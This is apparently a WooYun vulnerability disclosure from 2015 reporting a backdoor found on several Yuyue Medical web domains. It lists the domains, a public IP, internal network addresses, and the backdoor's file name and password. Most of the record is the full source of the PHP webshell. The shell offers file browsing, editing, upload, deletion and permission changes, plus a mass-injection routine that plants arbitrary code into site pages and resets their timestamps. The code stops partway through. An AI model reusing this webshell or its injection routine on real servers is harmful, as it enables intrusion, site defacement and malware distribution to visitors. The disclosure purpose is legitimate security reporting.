{"id": 66374, "wybug_id": "wooyun-2015-0140333", "wybug_title": "鱼跃医疗多个站点存在后门，可深入内网（一）", "wybug_corp": "鱼跃医疗", "wybug_author": "路人甲", "wybug_date": "2015-09-10 22:37", "wybug_open_date": "2015-10-25 22:38", "wybug_type": "成功的入侵事件", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": [], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-09-10：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-10-25：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 鱼跃医疗是国内最大的康复护理、医用供氧及医用临床系列医疗器械的专业生产企业。生产的产品共计50多个品种，近400余种规格，是全国同行业生产企业中产品品种最丰富的企业之一。鱼跃医疗秉承做专做精的理念，力争每个主要产品做到行业前三名，其前六大产品有制氧机，雾化器、血压计、听诊器、超轻微氧气阀五个产品的市场占有率达到全国第一，其中制氧机产品更是达到了全球销量第一的水平。轮椅车、电子血压计的市场占有率全国第二 详细说明：  存在问题的域名：yuyue.com.cn:82mail.yuyue.com.cn:82jf.yuyue.com.cn:82rtx.yuyue.com.cn:82ymall.yuyue.com.cn:82crm.yuyue.com.cn:82多个域名均指向同一个IP：218.3.85.243   漏洞证明：  主站：可以访问\n\nhelp.php为习科PHP木马：\n\n密码为silic主站内网：192.168.100.3\n\n系统信息：\n\ncrm内网IP:192.168.100.74\n\njf内网IP：192.168.100.90\n\nPHP木马：<code><?phperror_reporting(E_ERROR);header(\"content-Type: text/html; charset=gb2312\");set_time_limit(0);function Root_GP(&$array){\twhile(list($key,$var) = each($array))\t{\t\tif((strtoupper($key) != $key || ''.intval($key) == \"$key\") && $key != 'argc' && $key != 'argv')\t\t{\t\t\tif(is_string($var)) $array[$key] = stripslashes($var);\t\t\tif(is_array($var)) $array[$key] = Root_GP($var);  \t\t}\t}\treturn $array;}$password = \"silic\";function Root_CSS(){print<<<END<style type=\"text/css\">*{padding:0; margin:0;}body{background:threedface;font-family:\"Verdana\",\"Tahoma\",\"宋体\",sans-serif;font-size:13px;margin-top:3px;margin-bottom:3px;table-layout:fixed;word-break:break-all;}a{color:#000000;text-decoration:none;}a:hover{background:#BBBBBB;}table{color:#000000;font-family:\"Verdana\",\"Tahoma\",\"宋体\",sans-serif;font-size:13px;border:1px solid #999999;}td{background:#F9F6F4;}.toptd{background:threedface;width:310px;border-color:#FFFFFF #999999 #999999 #FFFFFF;border-style:solid;border-width:1px;}.msgbox{background:#FFFFE0;color:#FF0000;height:25px;font-size:12px;border:1px solid #999999;text-align:center;padding:3px;clear:both;}.actall{background:#F9F6F4;font-size:14px;border:1px solid #999999;padding:2px;margin-top:3px;margin-bottom:3px;clear:both;}</style>\\nEND;return false;}//文件管理class packdir{\tvar $out='';\tvar $datasec=array();\tvar $ctrl_dir=array();\tvar $eof_ctrl_dir=\"\\x50\\x4b\\x05\\x06\\x00\\x00\\x00\\x00\";\tvar $old_offset=0;function packdir($array){\tif(@function_exists('gzcompress'))\t{\t\tfor($n = 0;$n < count($array);$n++)\t\t{\t\t\t$array[$n] = urldecode($array[$n]);\t\t\t$fp = @fopen($array[$n], 'r');\t\t\t$filecode = @fread($fp, @filesize($array[$n]));\t\t\t@fclose($fp);\t\t\t$this -> filezip($filecode,basename($array[$n]));\t\t}\t@closedir($zhizhen);\t$this->out = $this->packfile();\treturn true;}return false;}function at($atunix = 0){\t$unixarr = ($atunix == 0) ? getdate() : getdate($atunix);\tif ($unixarr['year'] < 1980)\t{\t\t$unixarr['year']    = 1980;\t\t$unixarr['mon']     = 1;\t\t$unixarr['mday']    = 1;\t\t$unixarr['hours']   = 0;\t\t$unixarr['minutes'] = 0;\t\t$unixarr['seconds'] = 0;\t} \treturn (($unixarr['year'] - 1980) << 25) | ($unixarr['mon'] << 21) | ($unixarr['mday'] << 16) | ($unixarr['hours'] << 11) | ($unixarr['minutes'] << 5) | ($unixarr['seconds'] >> 1);}function filezip($data, $name, $time = 0){\t$name = str_replace('\\\\', '/', $name);\t$dtime = dechex($this->at($time));\t$hexdtime\t= '\\x'.$dtime[6].$dtime[7].'\\x'.$dtime[4].$dtime[5].'\\x'.$dtime[2].$dtime[3].'\\x'.$dtime[0].$dtime[1];\teval('$hexdtime = \"' . $hexdtime . '\";');\t$fr\t= \"\\x50\\x4b\\x03\\x04\";\t$fr\t.= \"\\x14\\x00\";\t$fr\t.= \"\\x00\\x00\";\t$fr\t.= \"\\x08\\x00\";\t$fr\t.= $hexdtime;\t$unc_len = strlen($data);\t$crc = crc32($data);\t$zdata = gzcompress($data);\t$c_len = strlen($zdata);\t$zdata = substr(substr($zdata, 0, strlen($zdata) - 4), 2);\t$fr .= pack('V', $crc);\t$fr .= pack('V', $c_len);\t$fr .= pack('V', $unc_len);\t$fr .= pack('v', strlen($name));\t$fr .= pack('v', 0);\t$fr .= $name;\t$fr .= $zdata;\t$fr .= pack('V', $crc);\t$fr .= pack('V', $c_len);\t$fr .= pack('V', $unc_len);\t$this -> datasec[] = $fr;\t$new_offset = strlen(implode('', $this->datasec));\t$cdrec = \"\\x50\\x4b\\x01\\x02\";\t$cdrec .= \"\\x00\\x00\";\t$cdrec .= \"\\x14\\x00\";\t$cdrec .= \"\\x00\\x00\";\t$cdrec .= \"\\x08\\x00\";\t$cdrec .= $hexdtime;\t$cdrec .= pack('V', $crc);\t$cdrec .= pack('V', $c_len);\t$cdrec .= pack('V', $unc_len);\t$cdrec .= pack('v', strlen($name) );\t$cdrec .= pack('v', 0 );\t$cdrec .= pack('v', 0 );\t$cdrec .= pack('v', 0 );\t$cdrec .= pack('v', 0 );\t$cdrec .= pack('V', 32 );\t$cdrec .= pack('V', $this -> old_offset );\t$this -> old_offset = $new_offset;\t$cdrec .= $name;\t$this -> ctrl_dir[] = $cdrec;}function packfile(){\t$data    = implode('', $this -> datasec);\t$ctrldir = implode('', $this -> ctrl_dir);\treturn $data.$ctrldir.$this -> eof_ctrl_dir.pack('v', sizeof($this -> ctrl_dir)).pack('v', sizeof($this -> ctrl_dir)).pack('V', strlen($ctrldir)).pack('V', strlen($data)).\"\\x00\\x00\";}}function File_Str($string){\treturn str_replace('//','/',str_replace('\\\\','/',$string));}function File_Size($size){\tif($size > 1073741824) $size = round($size / 1073741824 * 100) / 100 . ' G';\telseif($size > 1048576) $size = round($size / 1048576 * 100) / 100 . ' M';\telseif($size > 1024) $size = round($size / 1024 * 100) / 100 . ' K';\telse $size = $size . ' B';\treturn $size;}function File_Mode(){\t$RealPath = realpath('./');\t$SelfPath = $_SERVER['PHP_SELF'];\t$SelfPath = substr($SelfPath, 0, strrpos($SelfPath,'/'));\treturn File_Str(substr($RealPath, 0, strlen($RealPath) - strlen($SelfPath)));}function File_Read($filename){\t$handle = @fopen($filename,\"rb\");\t$filecode = @fread($handle,@filesize($filename));\t@fclose($handle);\treturn $filecode;}function File_Write($filename,$filecode,$filemode){\t$key = true;\t$handle = @fopen($filename,$filemode);\tif(!@fwrite($handle,$filecode))\t{\t@chmod($filename,0666);\t$key = @fwrite($handle,$filecode) ? true : false;\t}@fclose($handle);return $key;}function File_Up($filea,$fileb){\t$key = @copy($filea,$fileb) ? true : false;\tif(!$key) $key = @move_uploaded_file($filea,$fileb) ? true : false;\treturn $key;}function File_Down($filename){\tif(!file_exists($filename)) return false;\t$filedown = basename($filename);\t$array = explode('.', $filedown);\t$arrayend = array_pop($array);\theader('Content-type: application/x-'.$arrayend);\theader('Content-Disposition: attachment; filename='.$filedown);\theader('Content-Length: '.filesize($filename));\t@readfile($filename);\texit;}function File_Deltree($deldir){\tif(($mydir = @opendir($deldir)) == NULL) return false;\t\twhile(false !== ($file = @readdir($mydir)))\t{\t\t$name = File_Str($deldir.'/'.$file);\t\tif((is_dir($name)) && ($file!='.') && ($file!='..')){@chmod($name,0777);File_Deltree($name);}\t\tif(is_file($name)){@chmod($name,0777);@unlink($name);}\t} \t@closedir($mydir);\t@chmod($deldir,0777);\treturn @rmdir($deldir) ? true : false;}function File_Act($array,$actall,$inver){\tif(($count = count($array)) == 0) return '请选择文件';\tif($actall == 'e')\t{\t\t$zip = new packdir;\t\tif($zip->packdir($array)){$spider = $zip->out;header(\"Content-type: application/unknown\");header(\"Accept-Ranges: bytes\");header(\"Content-length: \".strlen($spider));header(\"Content-disposition: attachment; filename=\".$inver.\";\");echo $spider;exit;}\t\treturn '打包文件失败';\t}\t$i = 0;\twhile($i < $count)\t{\t\t$array[$i] = urldecode($array[$i]);\t\tswitch($actall)\t\t{\t\t\tcase \"a\" : $inver = urldecode($inver); if(!is_dir($inver)) return '路径错误'; $filename = array_pop(explode('/',$array[$i])); @copy($array[$i],File_Str($inver.'/'.$filename)); $msg = '复制到'.$inver.'目录'; break;\t\t\tcase \"b\" : if(!@unlink($array[$i])){@chmod($filename,0666);@unlink($array[$i]);} $msg = '删除'; break;\t\t\tcase \"c\" : if(!eregi(\"^[0-7]{4}$\",$inver)) return '属性值错误'; $newmode = base_convert($inver,8,10); @chmod($array[$i],$newmode); $msg = '属性修改为'.$inver; break;\t\t\tcase \"d\" : @touch($array[$i],strtotime($inver)); $msg = '修改时间为'.$inver; break;\t\t}\t\t$i++;\t}\treturn '所选文件'.$msg.'完毕';}function File_Edit($filepath,$filename,$dim = ''){\t$THIS_DIR = urlencode($filepath);\t$THIS_FILE = File_Str($filepath.'/'.$filename);\tif(file_exists($THIS_FILE)){$FILE_TIME = @date('Y-m-d H:i:s',filemtime($THIS_FILE));$FILE_CODE = htmlspecialchars(File_Read($THIS_FILE));}\telse {$FILE_TIME = @date('Y-m-d H:i:s',time());$FILE_CODE = '';}print<<<END<script language=\"javascript\">var NS4 = (document.layers);var IE4 = (document.all);var win = this;var n = 0;function search(str){\tvar txt, i, found;\tif(str == \"\")return false;\tif(NS4){\t\tif(!win.find(str)) while(win.find(str, false, true)) n++; else n++;\t\tif(n == 0) alert(str + \" ... Not-Find\")\t}\tif(IE4){\t\ttxt = win.document.body.createTextRange();\t\tfor(i = 0; i <= n && (found = txt.findText(str)) != false; i++){\t\t\ttxt.moveStart(\"character\", 1);\t\t\ttxt.moveEnd(\"textedit\")\t\t}\t\tif(found){txt.moveStart(\"character\", -1);txt.findText(str);txt.select();txt.scrollIntoView();n++}\t\telse{if (n > 0){n = 0;search(str)}else alert(str + \"... Not-Find\")}\t}\treturn false}function CheckDate(){\tvar re = document.getElementById('mtime').value;\tvar reg = /^(\\\\d{1,4})(-|\\\\/)(\\\\d{1,2})\\\\2(\\\\d{1,2}) (\\\\d{1,2}):(\\\\d{1,2}):(\\\\d{1,2})$/; \tvar r = re.match(reg);\tif(r==null){alert('日期格式不正确!格式:yyyy-mm-dd hh:mm:ss');return false;}\telse{document.getElementById('editor').submit();}}</script><div class=\"actall\">查找内容: <input name=\"searchs\" type=\"text\" value=\"{$dim}\" style=\"width:500px;\"><input type=\"button\" value=\"查找\" onclick=\"search(searchs.value)\"></div><form method=\"POST\" id=\"editor\" action=\"?s=a&p={$THIS_DIR}\"><div class=\"actall\"><input type=\"text\" name=\"pfn\" value=\"{$THIS_FILE}\" style=\"width:750px;\"></div><div class=\"actall\"><textarea name=\"pfc\" id style=\"width:750px;height:380px;\">{$FILE_CODE}</textarea></div><div class=\"actall\">文件修改时间 <input type=\"text\" name=\"mtime\" id=\"mtime\" value=\"{$FILE_TIME}\" style=\"width:150px;\"></div><div class=\"actall\"><input type=\"button\" value=\"保存\" onclick=\"CheckDate();\" style=\"width:80px;\"><input type=\"button\" value=\"返回\" onclick=\"window.location='?s=a&p={$THIS_DIR}';\" style=\"width:80px;\"></div></form>END;}function File_Soup($p){\t$THIS_DIR = urlencode($p);\t$UP_SIZE = get_cfg_var('upload_max_filesize');\t$MSG_BOX = '单个附件允许大小:'.$UP_SIZE.', 改名格式(new.php),如为空,则保持原文件名.';\tif(!empty($_POST['updir']))\t{\t\tif(count($_FILES['soup']) >= 1)\t\t{\t\t\t$i = 0;\t\t\tforeach ($_FILES['soup']['error'] as $key => $error)\t\t\t{\t\t\t\tif ($error == UPLOAD_ERR_OK)\t\t\t\t{\t\t\t\t\t$souptmp = $_FILES['soup']['tmp_name'][$key];\t\t\t\t\tif(!empty($_POST['reup'][$i]))$soupname = $_POST['reup'][$i]; else $soupname = $_FILES['soup']['name'][$key];\t\t\t\t\t$MSG[$i] = File_Up($souptmp,File_Str($_POST['updir'].'/'.$soupname)) ? $soupname.'上传成功' : $soupname.'上传失败';\t\t\t\t}\t\t\t\t$i++;\t\t\t}\t\t}\t\telse\t\t{\t\t\t$MSG_BOX = '请选择文件';\t\t}\t}print<<<END<div class=\"msgbox\">{$MSG_BOX}</div><form method=\"POST\" id=\"editor\" action=\"?s=q&p={$THIS_DIR}\" enctype=\"multipart/form-data\"><div class=\"actall\">上传到目录: <input type=\"text\" name=\"updir\" value=\"{$p}\" style=\"width:531px;height:22px;\"></div><div class=\"actall\">附件1 <input type=\"file\" name=\"soup[]\" style=\"width:300px;height:22px;\"> 改名 <input type=\"text\" name=\"reup[]\" style=\"width:130px;height:22px;\"> $MSG[0] </div><div class=\"actall\">附件2 <input type=\"file\" name=\"soup[]\" style=\"width:300px;height:22px;\"> 改名 <input type=\"text\" name=\"reup[]\" style=\"width:130px;height:22px;\"> $MSG[1] </div><div class=\"actall\">附件3 <input type=\"file\" name=\"soup[]\" style=\"width:300px;height:22px;\"> 改名 <input type=\"text\" name=\"reup[]\" style=\"width:130px;height:22px;\"> $MSG[2] </div><div class=\"actall\">附件4 <input type=\"file\" name=\"soup[]\" style=\"width:300px;height:22px;\"> 改名 <input type=\"text\" name=\"reup[]\" style=\"width:130px;height:22px;\"> $MSG[3] </div><div class=\"actall\">附件5 <input type=\"file\" name=\"soup[]\" style=\"width:300px;height:22px;\"> 改名 <input type=\"text\" name=\"reup[]\" style=\"width:130px;height:22px;\"> $MSG[4] </div><div class=\"actall\">附件6 <input type=\"file\" name=\"soup[]\" style=\"width:300px;height:22px;\"> 改名 <input type=\"text\" name=\"reup[]\" style=\"width:130px;height:22px;\"> $MSG[5] </div><div class=\"actall\">附件7 <input type=\"file\" name=\"soup[]\" style=\"width:300px;height:22px;\"> 改名 <input type=\"text\" name=\"reup[]\" style=\"width:130px;height:22px;\"> $MSG[6] </div><div class=\"actall\">附件8 <input type=\"file\" name=\"soup[]\" style=\"width:300px;height:22px;\"> 改名 <input type=\"text\" name=\"reup[]\" style=\"width:130px;height:22px;\"> $MSG[7] </div><div class=\"actall\"><input type=\"submit\" value=\"上传\" style=\"width:80px;\"> <input type=\"button\" value=\"返回\" onclick=\"window.location='?s=a&p={$THIS_DIR}';\" style=\"width:80px;\"></div></form>END;}function File_a($p){\tif(!$_SERVER['SERVER_NAME']) $GETURL = ''; else $GETURL = 'http://'.$_SERVER['SERVER_NAME'].'/';\t$MSG_BOX = '等待消息队列';\t$UP_DIR = urlencode(File_Str($p.'/..'));\t$REAL_DIR = File_Str(realpath($p));\t$FILE_DIR = File_Str(dirname(__FILE__));\t$ROOT_DIR = File_Mode();\t$THIS_DIR = urlencode(File_Str($REAL_DIR));\t$NUM_D = 0;\t$NUM_F = 0;\tif(!empty($_POST['pfn'])){$intime = @strtotime($_POST['mtime']);$MSG_BOX = File_Write($_POST['pfn'],$_POST['pfc'],'wb') ? '编辑文件 '.$_POST['pfn'].' 成功' : '编辑文件 '.$_POST['pfn'].' 失败';@touch($_POST['pfn'],$intime);}\tif(!empty($_FILES['ufp']['name'])){if($_POST['ufn'] != '') $upfilename = $_POST['ufn']; else $upfilename = $_FILES['ufp']['name'];$MSG_BOX = File_Up($_FILES['ufp']['tmp_name'],File_Str($REAL_DIR.'/'.$upfilename)) ? '上传文件 '.$upfilename.' 成功' : '上传文件 '.$upfilename.' 失败';}\tif(!empty($_POST['actall'])){$MSG_BOX = File_Act($_POST['files'],$_POST['actall'],$_POST['inver']);}\tif(isset($_GET['md'])){$modfile = File_Str($REAL_DIR.'/'.$_GET['mk']); if(!eregi(\"^[0-7]{4}$\",$_GET['md'])) $MSG_BOX = '属性值错误'; else $MSG_BOX = @chmod($modfile,base_convert($_GET['md'],8,10)) ? '修改 '.$modfile.' 属性为 '.$_GET['md'].' 成功' : '修改 '.$modfile.' 属性为 '.$_GET['md'].' 失败';}\tif(isset($_GET['mn'])){$MSG_BOX = @rename(File_Str($REAL_DIR.'/'.$_GET['mn']),File_Str($REAL_DIR.'/'.$_GET['rn'])) ? '改名 '.$_GET['mn'].' 为 '.$_GET['rn'].' 成功' : '改名 '.$_GET['mn'].' 为 '.$_GET['rn'].' 失败';}\tif(isset($_GET['dn'])){$MSG_BOX = @mkdir(File_Str($REAL_DIR.'/'.$_GET['dn']),0777) ? '创建目录 '.$_GET['dn'].' 成功' : '创建目录 '.$_GET['dn'].' 失败';}\tif(isset($_GET['dd'])){$MSG_BOX = File_Deltree($_GET['dd']) ? '删除目录 '.$_GET['dd'].' 成功' : '删除目录 '.$_GET['dd'].' 失败';}\tif(isset($_GET['df'])){if(!File_Down($_GET['df'])) $MSG_BOX = '下载文件不存在';}\tRoot_CSS();print<<<END<script type=\"text/javascript\">\tfunction Inputok(msg,gourl)\t{\t\tsmsg = \"当前文件:[\" + msg + \"]\";\t\tre = prompt(smsg,unescape(msg));\t\tif(re)\t\t{\t\t\tvar url = gourl + escape(re);\t\t\twindow.location = url;\t\t}\t}\tfunction Delok(msg,gourl)\t{\t\tsmsg = \"确定要删除[\" + unescape(msg) + \"]吗?\";\t\tif(confirm(smsg))\t\t{\t\t\tif(gourl == 'b')\t\t\t{\t\t\t\tdocument.getElementById('actall').value = escape(gourl);\t\t\t\tdocument.getElementById('fileall').submit();\t\t\t}\t\t\telse window.location = gourl;\t\t}\t}\tfunction CheckDate(msg,gourl)\t{\t\tsmsg = \"当前文件时间:[\" + msg + \"]\";\t\tre = prompt(smsg,msg);\t\tif(re)\t\t{\t\t\tvar url = gourl + re;\t\t\tvar reg = /^(\\\\d{1,4})(-|\\\\/)(\\\\d{1,2})\\\\2(\\\\d{1,2}) (\\\\d{1,2}):(\\\\d{1,2}):(\\\\d{1,2})$/; \t\t\tvar r = re.match(reg);\t\t\tif(r==null){alert('日期格式不正确!格式:yyyy-mm-dd hh:mm:ss');return false;}\t\t\telse{document.getElementById('actall').value = gourl; document.getElementById('inver').value = re; document.getElementById('fileall').submit();}\t\t}\t}\tfunction CheckAll(form)\t{\t\tfor(var i=0;i<form.elements.length;i++)\t\t{\t\t\tvar e = form.elements[i];\t\t\tif (e.name != 'chkall')\t\t\te.checked = form.chkall.checked;\t\t}\t}\tfunction SubmitUrl(msg,txt,actid)\t{\t\tre = prompt(msg,unescape(txt));\t\tif(re)\t\t{\t\t\tdocument.getElementById('actall').value = actid;\t\t\tdocument.getElementById('inver').value = escape(re);\t\t\tdocument.getElementById('fileall').submit();\t\t}\t}</script><div id=\"msgbox\" class=\"msgbox\">{$MSG_BOX}</div><div class=\"actall\" style=\"text-align:center;padding:3px;\"><form method=\"GET\"><input type=\"hidden\" id=\"s\" name=\"s\" value=\"a\"><input type=\"text\" name=\"p\" value=\"{$REAL_DIR}\" style=\"width:550px;height:22px;\"><select onchange=\"location.href='?s=a&p='+options[selectedIndex].value\">\t<option>---特殊目录---</option>\t<option value=\"{$ROOT_DIR}\">网站根目录</option>\t<option value=\"{$FILE_DIR}\">本程序目录</option>\t<option value=\"C:/\">C盘</option>\t<option value=\"D:/\">D盘</option>\t<option value=\"E:/\">E盘</option>\t<option value=\"F:/\">F盘</option>\t<option value=\"C:/Documents and Settings/All Users/「开始」菜单/程序/启动\">启动项</option>\t<option value=\"C:/Documents and Settings/All Users/Start Menu/Programs/Startup\">启动项(英)</option>\t<option value=\"C:/RECYCLER\">回收站</option>\t<option value=\"C:/Program Files\">Programs</option>\t<option value=\"/etc\">etc</option>\t<option value=\"/home\">home</option>\t<option value=\"/usr/local\">Local</option>\t<option value=\"/tmp\">Temp</option></select><input type=\"submit\" value=\"转到\" style=\"width:50px;\"></form><div style=\"margin-top:3px;\"></div><form method=\"POST\" action=\"?s=a&p={$THIS_DIR}\" enctype=\"multipart/form-data\">\t<input type=\"button\" value=\"新建文件\" onclick=\"Inputok('newfile.php','?s=p&fp={$THIS_DIR}&fn=');\">\t<input type=\"button\" value=\"新建目录\" onclick=\"Inputok('newdir','?s=a&p={$THIS_DIR}&dn=');\"> \t<input type=\"button\" value=\"批量上传\" onclick=\"window.location='?s=q&p={$REAL_DIR}';\"> \t<input type=\"file\" name=\"ufp\" style=\"width:300px;height:22px;\">\t<input type=\"text\" name=\"ufn\" style=\"width:121px;height:22px;\">\t<input type=\"submit\" value=\"上传\" style=\"width:50px;\"></form></div><form method=\"POST\" name=\"fileall\" id=\"fileall\" action=\"?s=a&p={$THIS_DIR}\"><table border=\"0\"><tr><td class=\"toptd\" style=\"width:450px;\"> <a href=\"?s=a&p={$UP_DIR}\"><b>上级目录</b></a></td><td class=\"toptd\" style=\"width:80px;\"> 操作 </td><td class=\"toptd\" style=\"width:48px;\"> 属性 </td><td class=\"toptd\" style=\"width:173px;\"> 修改时间 </td><td class=\"toptd\" style=\"width:75px;\"> 大小 </td></tr>END;\tif(($h_d = @opendir($p)) == NULL) return false;\twhile(false !== ($Filename = @readdir($h_d)))\t{\t\tif($Filename == '.' or $Filename == '..') continue;\t\t$Filepath = File_Str($REAL_DIR.'/'.$Filename);\t\tif(is_dir($Filepath))\t\t{\t\t\t$Fileperm = substr(base_convert(@fileperms($Filepath),10,8),-4);\t\t\t$Filetime = @date('Y-m-d H:i:s',@filemtime($Filepath));\t\t\t$Filepath = urlencode($Filepath);\t\t\techo \"\\r\\n\".' <tr><td> <a href=\"?s=a&p='.$Filepath.'\"><font face=\"wingdings\" size=\"3\">0</font><b> '.$Filename.' </b></a> </td> ';\t\t\t$Filename = urlencode($Filename);\t\t\techo ' <td> <a href=\"#\" onclick=\"Delok(\\''.$Filename.'\\',\\'?s=a&p='.$THIS_DIR.'&dd='.$Filename.'\\');return false;\"> 删除 </a> ';\t\t\techo ' <a href=\"#\" onclick=\"Inputok(\\''.$Filename.'\\',\\'?s=a&p='.$THIS_DIR.'&mn='.$Filename.'&rn=\\');return false;\"> 改名 </a> </td> ';\t\t\techo ' <td> <a href=\"#\" onclick=\"Inputok(\\''.$Fileperm.'\\',\\'?s=a&p='.$THIS_DIR.'&mk='.$Filename.'&md=\\');return false;\"> '.$Fileperm.' </a> </td> ';\t\t\techo ' <td>'.$Filetime.'</td> ';\t\t\techo ' <td> </td> </tr>'.\"\\r\\n\";\t\t\t$NUM_D++;\t\t}\t}\t@rewinddir($h_d);\twhile(false !== ($Filename = @readdir($h_d)))\t{\t\tif($Filename == '.' or $Filename == '..') continue;\t\t$Filepath = File_Str($REAL_DIR.'/'.$Filename);\t\tif(!is_dir($Filepath))\t\t{\t\t\t$Fileurls = str_replace(File_Str($ROOT_DIR.'/'),$GETURL,$Filepath);\t\t\t$Fileperm = substr(base_convert(@fileperms($Filepath),10,8),-4);\t\t\t$Filetime = @date('Y-m-d H:i:s',@filemtime($Filepath));\t\t\t$Filesize = File_Size(@filesize($Filepath));\t\t\tif($Filepath == File_Str(__FILE__)) $fname = '<font color=\"#8B0000\">'.$Filename.'</font>'; else $fname = $Filename;\t\t\techo \"\\r\\n\".' <tr><td> <input type=\"checkbox\" name=\"files[]\" value=\"'.urlencode($Filepath).'\"><a target=\"_blank\" href=\"'.$Fileurls.'\">'.$fname.'</a> </td>';\t\t\t$Filepath = urlencode($Filepath);\t\t\t$Filename = urlencode($Filename);\t\t\techo ' <td> <a href=\"?s=p&fp='.$THIS_DIR.'&fn='.$Filename.'\"> 编辑 </a> ';\t\t\techo ' <a href=\"#\" onclick=\"Inputok(\\''.$Filename.'\\',\\'?s=a&p='.$THIS_DIR.'&mn='.$Filename.'&rn=\\');return false;\"> 改名 </a> </td>';\t\t\techo ' <td>'.$Fileperm.'</td> ';\t\t\techo ' <td>'.$Filetime.'</td> ';\t\t\techo ' <td align=\"right\"> <a href=\"?s=a&df='.$Filepath.'\">'.$Filesize.'</a> </td></tr> '.\"\\r\\n\";\t\t\t$NUM_F++;\t\t}\t}\t@closedir($h_d);\tif(!$Filetime) $Filetime = '2009-01-01 00:00:00';print<<<END</table><div class=\"actall\"> <input type=\"hidden\" id=\"actall\" name=\"actall\" value=\"undefined\"> <input type=\"hidden\" id=\"inver\" name=\"inver\" value=\"undefined\"> <input name=\"chkall\" value=\"on\" type=\"checkbox\" onclick=\"CheckAll(this.form);\"> <input type=\"button\" value=\"复制\" onclick=\"SubmitUrl('复制所选文件到路径: ','{$THIS_DIR}','a');return false;\"> <input type=\"button\" value=\"删除\" onclick=\"Delok('所选文件','b');return false;\"> <input type=\"button\" value=\"属性\" onclick=\"SubmitUrl('修改所选文件属性值为: ','0666','c');return false;\"> <input type=\"button\" value=\"时间\" onclick=\"CheckDate('{$Filetime}','d');return false;\"> <input type=\"button\" value=\"打包\" onclick=\"SubmitUrl('打包并下载所选文件下载名为: ','silic.gz','e');return false;\"> 目录({$NUM_D}) / 文件({$NUM_F})</div> </form> END;\treturn true;}//批量挂马function Guama_Pass($length){\t$possible = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ\";\t$str = \"\";\twhile(strlen($str) < $length) $str .= substr($possible,(rand() % strlen($possible)),1);\treturn $str;}function Guama_Make($codea,$codeb,$codec){\treturn str_replace($codea,Guama_Pass($codeb),$codec);}function Guama_Auto($gp,$gt,$gl,$gc,$gm,$gf,$gi,$gk,$gd,$gb){\tif(($h_d = @opendir($gp)) == NULL) return false;\tif($gm > 12) return false;\twhile(false !== ($Filename = @readdir($h_d)))\t{\t\tif($Filename == '.' || $Filename == '..') continue;\t\tif($gl != ''){if(eregi($gl,$Filename)) continue;}\t\t$Filepath = File_Str($gp.'/'.$Filename);\t\tif(is_dir($Filepath) && $gb) Guama_Auto($Filepath,$gt,$gl,$gc,$gm,$gf,$gi,$gk,$gd,$gb);\t\tif(eregi($gt,$Filename))\t\t{\t\t\t$fc = File_Read($Filepath);\t\t\tif(($gk != '') && (stristr($fc,chop($gk)))) continue;\t\t\tif(($gf != '') && ($gm != 0)) $gcm = Guama_Make($gf,$gm,$gc); else $gcm = $gc;\t\t\tif($gd) $ftime = @filemtime($Filepath);\t\t\tif($gi == 'a'){if(!stristr($fc,'</head>')) continue; $fcm = str_replace('</head>',\"\\r\\n\".$gcm.\"\\r\\n\".'</head>',$fc); $fcm = str_replace('</HEAD>',\"\\r\\n\".$gcm.\"\\r\\n\".'</HEAD>',$fcm);}\t\t\tif($gi == 'b') $fcm = $gcm.\"\\r\\n\".$fc;\t\t\tif($gi == 'c') $fcm = $fc.\"\\r\\n\".$gcm;\t\t\techo File_Write($Filepath,$fcm,'wb') ? '<font color=\"#006600\">成功:</font>'.$Filepath.' <br>'.\"\\r\\n\" : '<font color=\"#FF0000\">失败:</font>'.$Filepath.' <br>'.\"\\r\\n\";\t\t\tif($gd) @touch($Filepath,$ftime);\t\t\tob_flush();\t\t\tflush();\t\t}\t}\t@closedir($h_d);\treturn true;}function Guama_b(){\tif((!empty($_POST['gp'])) && (!empty($_POST['gt'])) && (!empty($_POST['gc'])))\t{\t\techo '<div class=\"actall\">';\t\t$_POST['gt'] = str_replace('.','\\\\.',$_POST['gt']);\t\tif($_POST['inout'] == 'a') $_POST['gl'] = str_replace('.','\\\\.',$_POST['gl']); else $_POST['gl'] = '';\t\tif(stristr($_POST['gc'],'[-') && stristr($_POST['gc'],'-]'))\t\t{\t\t\t$temp = explode('[-',$_POST['gc']);\t\t\t$gk = $temp[0];\t\t\tpreg_match_all(\"/\\[\\-([^~]*?)\\-\\]/i\",$_POST['gc'],$nc);\t\t\tif(!eregi(\"^[0-9]{1,2}$\",$nc[1][0])){echo '<a href=\"#\" onclick=\"history.back();\">异常终止</a>'; return false;}\t\t\t$gm = (int)$nc[1][0];\t\t\t$gf = $nc[0][0];\t\t}\t\telse\t\t{\t\t\t$gk = $_POST['gc'];\t\t\t$gm = 0;\t\t\t$gf = '';\t\t}\t\tif(!isset($_POST['gx'])) $gk = '';\t\t$gd = isset($_POST['gd']) ? true : false;\t\t$gb = ($_POST['gb'] == 'a') ? true : false;\t\techo Guama_Auto($_POST['gp'],$_POST['gt'],$_POST['gl'],$_POST['gc'],$gm,$gf,$_POST['gi'],$gk,$gd,$gb) ? '<a href=\"#\" onclick=\"history.back();\">完毕</a>' : '<a href=\"#\" onclick=\"history.back();\">异常终止</a>';\t\techo '</div>';\t\treturn false;\t}\t$FILE_DIR = File_Str(dirname(__FILE__));\t$ROOT_DIR = File_Mode();print<<<END<script language=\"javascript\">function Fulll(i){\tif(i==0) return false;  Str = new Array(5);  if(i <= 2){Str[1] = \"{$ROOT_DIR}\";Str[2] = \"{$FILE_DIR}\";sform.gp.value = Str[i];}  else{Str[3] = \".htm|.html|.shtml\";Str[4] = \".htm|.html|.shtml|.asp|.php|.cgi|.aspx\";Str[5] = \".js\";sform.gt.value = Str[i];}  return true;}function autorun(){\tif(document.getElementById('gp').value == ''){alert('路径不能为空');return false;}\tif(document.getElementById('gt').value == ''){alert('类型不能为空');return false;}\tif(document.getElementById('gc').value == ''){alert('代码不能为空');return false;}\tdocument.getElementById('sform').submit();}</script><form method=\"POST\" name=\"sform\" id=\"sform\" action=\"?s=b\"><div class=\"actall\" style=\"height:35px;\">挂马路径<input type=\"text\" name=\"gp\" id=\"gp\" value=\"{$ROOT_DIR}\" style=\"width:500px;\"><select onchange='return Fulll(options[selectedIndex].value)'><option value=\"0\" selected>--范围选择--</option><option value=\"1\">网站根目录</option><option 